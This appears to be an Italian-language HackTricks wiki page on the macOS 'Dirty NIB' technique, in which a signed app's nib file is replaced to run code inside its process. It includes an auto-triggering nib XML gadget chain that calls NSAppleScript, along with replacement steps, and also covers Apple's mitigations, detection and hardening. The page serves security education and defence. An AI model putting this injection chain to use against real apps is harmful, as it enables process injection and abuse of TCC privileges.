# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB si riferisce all’abuso di file Interface Builder (.xib/.nib) all’interno di un bundle di app macOS firmata per eseguire logica controllata dall’attaccante all’interno del processo target, ereditandone così entitlements e permessi TCC. Questa tecnica è stata documentata originariamente da xpn (MDSec) e successivamente generalizzata e notevolmente ampliata da Sector7, che ha anche trattato le mitigazioni di Apple in macOS 13 Ventura e macOS 14 Sonoma. Per contesto e approfondimenti, vedere i riferimenti alla fine.

> TL;DR
> • Before macOS 13 Ventura: sostituire il MainMenu.nib di un bundle (o un altro nib caricato all’avvio) poteva ottenere in modo affidabile process injection e spesso privilege escalation.
> • Since macOS 13 (Ventura) and improved in macOS 14 (Sonoma): first‑launch deep verification, bundle protection, Launch Constraints, and the new TCC “App Management” permission impediscono in larga parte la manomissione post‑launch dei nib da parte di app non correlate. Gli attacchi possono comunque essere possibili in casi di nicchia (es., tooling dello stesso sviluppatore che modifica le proprie app, o terminali a cui l’utente ha concesso App Management/Full Disk Access).

## What are NIB/XIB files

Nib (abbreviazione di NeXT Interface Builder) sono file che serializzano grafi di oggetti UI usati dalle app AppKit. Xcode moderno salva file .xib XML modificabili che vengono compilati in .nib al build time. Un’app tipica carica la sua UI principale tramite `NSApplicationMain()` che legge la chiave `NSMainNibFile` dall’Info.plist dell’app e istanzia il grafo di oggetti a runtime.

Punti chiave che abilitano l’attacco:
- Il caricamento dei NIB istanzia classi Objective‑C arbitrarie senza richiedere che queste implementino NSSecureCoding (il nib loader di Apple ricorre a `init`/`initWithFrame:` quando `initWithCoder:` non è disponibile).
- Cocoa Bindings possono essere abusati per chiamare metodi mentre i nib vengono istanziati, incluse chiamate concatenate che non richiedono interazione dell’utente.


## Dirty NIB injection process (attacker view)

Il flusso classico pre‑Ventura:
1) Create a malicious .xib
- Add an `NSAppleScript` object (or other “gadget” classes such as `NSTask`).
- Add an `NSTextField` whose title contains the payload (e.g., AppleScript or command arguments).
- Add one or more `NSMenuItem` objects wired via bindings to call methods on the target object.

2) Auto‑trigger without user clicks
- Use bindings to set a menu item’s target/selector and then invoke the private `_corePerformAction` method so the action fires automatically when the nib loads. This removes the need for a user to click a button.

Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Questo consente l'esecuzione arbitraria di AppleScript nel processo target al caricamento del nib. Catene avanzate possono:
- Istanziare classi AppKit arbitrarie (es., `NSTask`) e chiamare metodi senza argomenti come `-launch`.
- Chiamare selector arbitrari con argomenti oggetto tramite il trucco di binding sopra.
- Caricare AppleScriptObjC.framework per fare da ponte verso Objective‑C e persino chiamare alcune API C selezionate.
- Su sistemi più vecchi che includono ancora Python.framework, fare da ponte verso Python e poi usare `ctypes` per chiamare funzioni C arbitrarie (ricerca di Sector7).

3) Sostituire il nib dell'app
- Copiare target.app in una posizione scrivibile, sostituire ad esempio `Contents/Resources/MainMenu.nib` con il nib maligno e avviare target.app. Prima di Ventura, dopo una valutazione Gatekeeper eseguita una volta, i lanci successivi eseguivano solo controlli superficiali sulla firma, quindi le risorse non eseguibili (come .nib) non venivano nuovamente verificate.

Esempio di payload AppleScript per un test visibile:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)

Apple ha introdotto diverse mitigazioni sistemiche che riducono drasticamente la fattibilità di Dirty NIB nelle versioni moderne di macOS:
- First‑launch deep verification and bundle protection (macOS 13 Ventura)
- Al primo avvio di qualsiasi app (quarantined o no), un controllo approfondito della firma copre tutte le risorse del bundle. Successivamente, il bundle diventa protetto: solo le app dello stesso developer (o esplicitamente permesse dall’app) possono modificarne il contenuto. Altre app richiedono la nuova permessione TCC “App Management” per scrivere all’interno del bundle di un’altra app.
- Launch Constraints (macOS 13 Ventura)
- Le app di sistema/fornite da Apple non possono essere copiate altrove e lanciate; questo annulla l’approccio “copia in /tmp, patch, esegui” per le app di sistema.
- Improvements in macOS 14 Sonoma
- Apple ha rafforzato App Management e corretto bypass noti (es. CVE‑2023‑40450) segnalati da Sector7. Python.framework è stato rimosso in precedenza (macOS 12.3), interrompendo alcune catene di privilege‑escalation.
- Gatekeeper/Quarantine changes
- Per una discussione più ampia su Gatekeeper, provenance e le modifiche di assessment che hanno impattato questa tecnica, vedi la pagina referenziata sotto.

> Practical implication
> • Su Ventura+ generalmente non puoi modificare il .nib di un’app di terze parti a meno che il tuo processo non abbia App Management o sia firmato con lo stesso Team ID del target (es. tooling per sviluppatori).
> • Concedere App Management o Full Disk Access a shell/terminal riapre effettivamente questa superficie d’attacco per qualsiasi cosa possa eseguire codice nel contesto di quel terminal.

### Addressing Launch Constraints

Launch Constraints impediscono di eseguire molte app Apple da posizioni non predefinite a partire da Ventura. Se facevi affidamento su workflow pre‑Ventura come copiare un’app Apple in una directory temporanea, modificare `MainMenu.nib` e lanciarla, aspettati che fallisca su >= 13.0.


## Enumerating targets and nibs (useful for research / legacy systems)

- Locate apps whose UI is nib‑driven:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Trova risorse nib candidate all'interno di un bundle:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Valida in modo approfondito le firme del codice (fallirà se hai manomesso le risorse e non le hai ri‑firmate):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Nota: su macOS moderno verrai anche bloccato da bundle protection/TCC quando provi a scrivere nel bundle di un'altra app senza la dovuta autorizzazione.


## Rilevamento e suggerimenti DFIR

- Monitoraggio dell'integrità dei file sulle risorse del bundle
- Monitorare cambiamenti di mtime/ctime in `Contents/Resources/*.nib` e altre risorse non‑eseguibili nelle app installate.
- Log unificati e comportamento dei processi
- Monitorare esecuzioni inaspettate di AppleScript all'interno di app GUI e processi che caricano AppleScriptObjC o Python.framework. Esempio:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Valutazioni proattive
- Eseguire periodicamente `codesign --verify --deep` sulle app critiche per assicurarsi che le risorse rimangano integre.
- Contesto di privilegi
- Verificare chi/che cosa ha TCC “App Management” o Full Disk Access (specialmente terminali e agent di gestione). Rimuovere queste autorizzazioni dalle shell di uso generale impedisce di riabilitare agevolmente manomissioni in stile Dirty NIB.


## Indurimento difensivo (sviluppatori e difensori)

- Preferire UI programmatica o limitare ciò che viene istanziato da nib. Evitare di includere classi potenti (es., `NSTask`) nei grafi nib ed evitare binding che invocano indirettamente selector su oggetti arbitrari.
- Adottare l'hardened runtime con Library Validation (già standard per le app moderne). Pur non impedendo di per sé la nib injection, blocca il caricamento facile di codice nativo e costringe gli attaccanti a payload solo scripting.
- Non richiedere o dipendere da ampie autorizzazioni App Management in strumenti di uso generale. Se l'MDM richiede App Management, separare quel contesto dalle shell guidate dall'utente.
- Verificare regolarmente l'integrità del bundle della tua app e rendere i meccanismi di aggiornamento capaci di riparare automaticamente le risorse del bundle.


## Letture correlate in HackTricks

Per saperne di più su Gatekeeper, quarantine e i cambiamenti di provenance che influenzano questa tecnica:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Riferimenti

- xpn – DirtyNIB (write‑up originale con esempio Pages): https://blog.xpnsec.com/dirtynib/
- Sector7 – Bringing process injection into view(s): sfruttare tutte le app macOS che usano nib files (5 aprile 2024): https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/

{{#include ../../../banners/hacktricks-training.md}}
